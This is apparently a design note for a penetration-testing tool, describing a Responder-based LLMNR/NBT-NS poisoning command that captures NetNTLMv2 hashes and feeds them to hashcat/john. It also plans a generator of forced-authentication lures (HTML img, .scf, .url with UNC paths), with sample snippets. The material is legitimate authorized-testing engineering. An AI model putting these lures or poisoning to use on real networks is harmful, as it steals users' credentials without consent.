# NetNTLMv2 capture engine — design note

> Status: **Phase 1 (capture via Responder) — BUILT & merged** as `redness poison`.
> **Phase 2 (`redness trigger` — forced-authentication link) — planned; see the Phase 2
> section below.** This is the intrusive "capture a hash by coercing authentication"
> feature. Owner: **anjaiv** (engines area). Read `CLAUDE.md` and `docs/DECISIONS.md`
> first, then this. Coordinate with the repo owner before coding — especially the
> `crack.py` meta contract below.

## What it is (and why it's separate)
Everything REDNESS captures today (AS-REP, Kerberoast — see `engines/ldap.py`) is
obtained by *asking the DC* during normal enumeration. **NetNTLMv2 capture is different:
it's an active man-in-the-middle on the local segment.** You run a poisoner that answers
**LLMNR / NBT-NS / mDNS** name-resolution requests, coercing nearby hosts to authenticate
to you, and you capture their **NetNTLMv2** responses (crackable offline).

Because it *touches other machines on the LAN*, it is **not** part of `scan` and **never**
runs by default. It's opt-in, time-boxed, and loud.

## Approach: orchestrate, don't reimplement (same as every other engine)
Do **not** write a poisoner from scratch. Wrap the standard tools:
- **[Responder](https://github.com/lgandx/Responder)** — LLMNR/NBT-NS/mDNS poisoning +
  capture. This is the capture engine. (Kali-native — perfect for the Kali operator box.)
- **Forced-authentication trigger links (Phase 2, `redness trigger`)** — a generated
  UNC-path artifact (HTML `<img>`, `.scf`, `.url`) that coerces a *specific* victim to
  authenticate to us; the auth is captured by the *same* Responder listener. Pure stdlib
  string generation — nothing to wrap. (ntlmrelayx-style live relay was considered and
  deliberately dropped — see the Phase 2 section.)

Parse Responder's output (its log files under `logs/` contain
`... NTLMv2-SSP Hash : user::DOMAIN:...`) into `Finding`s — pure parser, testable against
a captured log sample, exactly like `netexec.py` / `certipy.py`.

## It doesn't fit the per-target `run()` model — use a command, not `run_scan`
Engines today are `run(target) -> list[Finding]` (one shot per host). A poisoner is a
**long-running listener on an interface**, not a per-target action. So:
- Add a dedicated CLI command: **`redness poison --iface eth0 --duration 600`**
  (not part of `scan` / `default_engines()`).
- It can still stream to the live graph via the same `EventBus` (nodes for each victim
  host/account, edges labeled "poisoned", findings as they land) and write the same
  report — reuse `events.py` and the `Finding` schema.
- Implement it as its own module (`redness/poison.py` + a thin Responder wrapper in
  `engines/`), or an `Engine` subclass with a `run_listener(duration)` method — your call;
  keep the **parser pure and separate** from the subprocess either way.

## The contract with `crack.py` (agree on this before coding)
NetNTLMv2 hashes must flow into the existing crack pipeline. Two small, additive changes:
1. **Findings carry the hash** in `meta["hashes"]`, same shape as `ldap.py`:
   `{"account": "...", "hash": "<user::DOMAIN:...>", "type": "netntlmv2"}`.
2. **`crack.py` learns the type** — add `netntlmv2` to the maps:
   - `HASHCAT_MODE["netntlmv2"] = "5600"`
   - `JOHN_FORMAT["netntlmv2"] = "netntlmv2"`
   Then `collect_hashes` / `write_loot` / `crack` / `annotate` work unchanged, and
   `credential-cracked` findings appear just like the roasting ones.

That's the whole integration — the loot/crack machinery is already there.

## Findings to emit
| id | severity | when |
|----|----------|------|
| `netntlm-captured` | HIGH | one or more NetNTLMv2 hashes captured |
| `llmnr-nbtns-poisoning-possible` | MEDIUM | LLMNR/NBT-NS answered (name-resolution poisoning works here) |
| `credential-cracked` | CRITICAL | (via `crack.py`, once a captured hash cracks) |
Each carries impact + remediation (disable LLMNR/NBT-NS via GPO; enable SMB signing;
segment the network).

## Safety / gating (this feature is intrusive — treat it that way)
- **Separate opt-in command** (`redness poison`), never invoked by `scan`.
- **Explicit confirmation prompt** on start ("this poisons LLMNR/NBT-NS on <iface> and
  affects other hosts on this segment — type YES"), plus a `--yes` flag for scripted use.
- **Time-boxed** (`--duration`, sane default) and **interface-scoped** (`--iface` required).
- Print an **authorization banner**: authorized, in-scope engagements only.
- Keep captured hashes in `loot/` (already git-ignored).

## Dependencies
- **Responder** — Linux/Kali (`sudo apt install responder`, or from git). Windows is not a
  realistic host for this; the Kali VM is the operator box. `redness doctor` should learn
  a `responder` check (available/where to get it), mirroring the netexec/certipy entries.

## Build order — Phase 1 (done)
1. Pure parser: `parse_responder_log(text) -> list[(account, netntlmv2_hash)]` + tests
   against a captured `Responder-Session.log` sample. (No root, no network.)
2. `crack.py`: add the two `netntlmv2` map entries (+ a test).
3. `redness poison` command: subprocess Responder, tail its logs, emit findings/graph,
   confirmation + duration + iface gating.
4. `doctor`: add the `responder` availability check.
5. Docs: DECISIONS entry; a note in CLAUDE.md "Next up".

# Phase 2 — `redness trigger`: forced-authentication link generator

Phase 1 waits for victims to resolve a poisoned name. Phase 2 flips it around: hand a
victim a small artifact that, when opened or rendered, makes *their* machine authenticate
to `\\<us>\share\...` over SMB. It's a **coercion vector, not a new capture path** — the
auth lands in the *same* Responder listener and flows through the identical pipeline:
`parse_responder_log` → `build_findings` (`netntlm-captured`) → `crack.py` (`netntlmv2`).

**Why not ntlmrelayx relay?** Live relay (authenticate as the victim straight into a
target service) is powerful but heavy and far more intrusive — a successful relay is
direct access to a third-party system, with AD-mutating attack modes (RBCD, add-computer,
ADCS ESC8). We deliberately scoped Phase 2 down to the simple, capture-only lure instead.

## It's a helper, not an Engine
Generation produces an *artifact*, not `Finding`s, so it doesn't fit the `run(target) ->
list[Finding]` model, isn't in `default_engines()`, and never touches `scan`. It's pure
string/file generation — no network, no subprocess, no external tool to orchestrate, and
so **no new `doctor` check**.
- `redness/trigger.py` — pure builders: `unc_path(host, share, filename)` + per-format wrappers.
- `redness trigger --host <us> [--format html|scf|url] [--share s] [--filename x.jpg] [--out path]`
  — prints the artifact, or writes it to `--out`.

## Formats (v1: html, scf, url — all text; lnk is binary, later)
- **html** — `<img src="\\host\share\x.jpg">` (email / web page / CSS body). Default.
- **scf** — Windows Explorer `.scf` (`[Shell]…IconFile=\\host\share\x.ico`); fires on folder view.
- **url** — `.url` `[InternetShortcut]` with `IconFile=\\host\…`.
- **lnk** — `.lnk` shortcut with a UNC icon; binary and fiddlier, **deferred to a later pass**.

## Capture: run `poison` normally
There is no separate capture command in v1. The operator runs the existing gated
`redness poison` (Responder) to listen, and delivers the trigger artifact out-of-band;
captures flow through unchanged. A poisoning-off `--capture-only` listen mode would be a
cleaner pairing (the lure needs no LLMNR/NBT-NS poisoning), but it is **deferred** until
someone validates on the Kali box that Responder still captures incoming SMB auth with
poisoning disabled.

## "Flag if signing isn't enforced"
The generator can't know a host's signing state — that's discovered by probing SMB. Reuse
the existing `smb-signing-not-required` finding (netexec SMB engine): run `scan` / the SMB
signing check against the captured host. No new logic in the trigger feature.

## Findings & contract
**No new findings; no `findings.py` or `crack.py` changes.** Capture reuses
`netntlm-captured` (HIGH) and the `netntlmv2` crack path already shipped in Phase 1.

## Safety / gating
Generating the file touches no other machine, so no `type YES` prompt is needed — but
print the same **authorization banner**, write artifacts to a git-ignored dir, and keep
the legal note: the artifact coerces a real user's credentials; deploy only within written
scope. The intrusive steps (delivering the lure, running the listener) stay with the
operator and the already-gated `poison` command.

## Build order — Phase 2
1. Pure `redness/trigger.py` (`unc_path` + html/scf/url builders) + `tests/test_trigger.py`.
2. `redness trigger` CLI command + banner.
3. Docs: DECISIONS entry + CLAUDE.md.

## Legal / ethics
Poisoning coerces authentication from **other machines** on the LAN. Run only on a
network you are **explicitly authorized** to test, within the agreed scope and window.
